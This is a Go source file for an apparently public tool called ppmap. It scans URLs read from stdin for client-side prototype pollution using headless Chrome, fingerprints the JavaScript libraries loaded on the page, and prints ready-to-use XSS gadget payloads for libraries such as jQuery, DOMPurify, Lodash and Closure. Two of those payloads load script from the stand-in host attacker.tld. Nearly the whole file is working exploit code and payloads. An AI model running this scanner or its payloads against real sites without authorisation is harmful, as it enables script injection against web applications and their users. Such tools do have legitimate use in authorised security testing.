package main
import"os"
import "bufio"
import (
    "context"
    "log"
    "github.com/chromedp/chromedp"
    "strings"
    "time"
)

//some fancy colour variables here
const (
        Info    = "[\033[33mINFO\033[0m]"
        Vulnerable = "[\033[32mVULN\033[0m]"
        Error   = "[\033[31mERRO\033[0m]"
        Exploit   = "[\033[34mEXPL\033[0m]"
)

var fingerprint string = `(() => {
  let gadgets = 'default';
  if (typeof _satellite !== 'undefined') {
    gadgets = 'Adobe Dynamic Tag Management ';
  } else if (typeof BOOMR !== 'undefined') {
    gadgets = 'Akamai Boomerang ';
  } else if (typeof goog !== 'undefined' && typeof goog.basePath !== 'undefined') {
    gadgets = 'Closure ';
  } else if (typeof DOMPurify !== 'undefined') {
    gadgets = 'DOMPurify ';
  } else if (typeof window.embedly !== 'undefined') {
    gadgets = 'Embedly Cards ';
  } else if (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined') {
    gadgets = 'jQuery ';
  } else if (typeof filterXSS !== 'undefined') {
    gadgets = 'js-xss ';
  } else if (typeof ko !== 'undefined' && typeof ko.version !== 'undefined') {
    gadgets = 'Knockout.js ';
  } else if (typeof _ !== 'undefined' && typeof _.template !== 'undefined' && typeof _.VERSION !== 'undefined') {
    gadgets = 'Lodash <= 4.17.15 ';
  } else if (typeof Marionette !== 'undefined') {
    gadgets = 'Marionette.js / Backbone.js ';
  } else if (typeof recaptcha !== 'undefined') {
    gadgets = 'Google reCAPTCHA ';
  } else if (typeof sanitizeHtml !== 'undefined') {
    gadgets = 'sanitize-html ';
  } else if (typeof analytics !== 'undefined' && typeof analytics.SNIPPET_VERSION !== 'undefined') {
    gadgets = 'Segment Analytics.js ';
  } else if (typeof Sprint !== 'undefined') {
    gadgets = 'Sprint.js ';
  } else if (typeof SwiftypeObject != 'undefined') {
    gadgets = 'Swiftype Site Search ';
  } else if (typeof utag !== 'undefined' && typeof utag.id !== 'undefined') {
    gadgets = 'Tealium Universal Tag ';
  } else if (typeof twq !== 'undefined' && typeof twq.version !== 'undefined') {
    gadgets = 'Twitter Universal Website Tag ';
  } else if (typeof wistiaEmbeds !== 'undefined') {
    gadgets = 'Wistia Embedded Video ';
  } else if (typeof $ !== 'undefined' && typeof $.zepto !== 'undefined') {
    gadgets = 'Zepto.js ';
  }

 return gadgets;
})();
`

func main() {
    log.Printf(`                                                                                 
    dMMMMb  dMMMMb  dMMMMMMMMb  .aMMMb  dMMMMb     v1.0.1
   dMP.dMP dMP.dMP dMP"dMP"dMP dMP"dMP dMP.dMP 
  dMMMMP" dMMMMP" dMP dMP dMP dMMMMMP dMMMMP"  
 dMP     dMP     dMP dMP dMP dMP dMP dMP           
dMP     dMP     dMP dMP dMP dMP dMP dMP            @kleiton0x7e

                                     
`)
    
    time.Sleep(2 * time.Second)
    var quote string
    
    payloads := [4]string{
        "constructor%5Bprototype%5D%5Bppmap%5D=reserved",
        "__proto__.ppmap=reserved",
        "constructor.prototype.ppmap=reserved",
        "__proto__%5Bppmap%5D=reserved",
    }
    
    sc := bufio.NewScanner(os.Stdin)
    for sc.Scan() {
	u := sc.Text()
        
        res := strings.Contains(u, "?")
        
        if res == true {
            quote = `&`   
        } else {
            quote = `?`
        }
        
        for index, payload := range payloads {
            _ = index
            url := string(u) + string(quote) + string(payload)
            ctx, cancel := chromedp.NewContext(context.Background())
            defer cancel()

            // run task list
            var res string
            err := chromedp.Run(ctx,
                chromedp.Navigate(url),
                chromedp.Evaluate(`window.ppmap`, &res),
            )
            if err != nil {
                log.Printf(Error + " %s", url)
                continue
            }

            log.Printf(Vulnerable + " %s", url)
            time.Sleep(1 * time.Second)
            //now its fingerprinting time
            log.Printf(Info + " Fingerprinting the gadget...")
            time.Sleep(3 * time.Second)
            var res1 string
            err1 := chromedp.Run(ctx,
                chromedp.Navigate(u),
                chromedp.Evaluate(fingerprint, &res1),
            )
            if err1 != nil {
                log.Fatal(err1)
            }
                
            log.Printf(Info + " Gadget found: " + string(res1))
            time.Sleep(2 * time.Second)
        
            if strings.Contains(string(res1), "default") {
               log.Printf(Error + " No gadget found") 
               log.Printf(Info + " Website is vulnerable to Prototype Pollution, but not automatically exploitable")
            } else if strings.Contains(string(res1), "Adobe Dynamic Tag Management") {
               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[src]=data:,alert(1)//")
            } else if strings.Contains(string(res1), "Akamai Boomerang") {
               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[BOOMR]=1&__proto__[url]=//attacker.tld/js.js")
            } else if strings.Contains(string(res1), "Closure") {
               log.Printf(Info + " Displaying all possible payloads")
               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[*%%20ONERROR]=1&__proto__[*%20SRC]=1") 
               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[CLOSURE_BASE_PATH]=data:,alert(1)//")
            } else if strings.Contains(string(res1), "DOMPurify") {
               log.Printf(Info + " Displaying all possible payloads")
               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src") 
               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[documentMode]=9")
            } else if strings.Contains(string(res1), "Embedly") {
               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[onload]=alert(1)") 
            } else if strings.Contains(string(res1), "jQuery") {
               log.Printf(Info + " Displaying all possible payloads")
               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[context]=<img/src/onerror%%3dalert(1)>&__proto__[jquery]=x")
               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script")
               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[url]=data:,alert(1)//&__proto__[dataType]=script&__proto__[crossDomain]=")
               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[src][]=data:,alert(1)//")
               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[url]=data:,alert(1)//")
               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[div][0]=1&__proto__[div][1]=<img/src/onerror%%3dalert(1)>&__proto__[div][2]=1")
               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[preventDefault]=x&__proto__[handleObj]=x&__proto__[delegateTarget]=<img/src/onerror%3dalert(1)>")
            } else if strings.Contains(string(res1), "js-xss") {
               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[whiteList][img][0]=onerror&__proto__[whiteList][img][1]=src") 
            } else if strings.Contains(string(res1), "Knockout.js") {
               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[4]=a':1,[alert(1)]:1,'b&__proto__[5]=,")
            } else if strings.Contains(string(res1), "Lodash <= 4.17.15") {
               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[sourceURL]=%%E2%80%A8%%E2%80%A9alert(1)") 
            } else if strings.Contains(string(res1), "Marionette.js / Backbone.js") {
               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[tagName]=img&__proto__[src][]=x:&__proto__[onerror][]=alert(1)")
            } else if strings.Contains(string(res1), "Google reCAPTCHA") {
               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[srcdoc][]=<script>alert(1)</script>") 
            } else if strings.Contains(string(res1), "sanitize-html") {
               log.Printf(Info + " Displaying all possible payloads")
               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[*][]=onload")
               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[innerText]=<script>alert(1)</script>")
            } else if strings.Contains(string(res1), "Segment Analytics.js") {
               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[script][0]=1&__proto__[script][1]=<img/src/onerror%%3dalert(1)>&__proto__[script][2]=1")
            } else if strings.Contains(string(res1), "Sprint.js") {
               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[div][intro]=<img%%20src%%20onerror%%3dalert(1)>")
            } else if strings.Contains(string(res1), "Swiftype Site Search") {
               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[xxx]=alert(1)")
            } else if strings.Contains(string(res1), "Tealium Universal Tag") {
               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[attrs][src]=1&__proto__[src]=//attacker.tld/js.js") 
            } else if strings.Contains(string(res1), "Twitter Universal Website Tag") {
               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[attrs][src]=1&__proto__[hif][]=javascript:alert(1)") 
            } else if strings.Contains(string(res1), "Wistia Embedded Video") {
               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[innerHTML]=<img/src/onerror=alert(1)>")
            } else if strings.Contains(string(res1), "Zepto.js") {
               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[onerror]=alert(1)")
            } else {
               log.Printf(Error + " An unexcepted error occured")
            }
            
            break 
        }      
    }
}
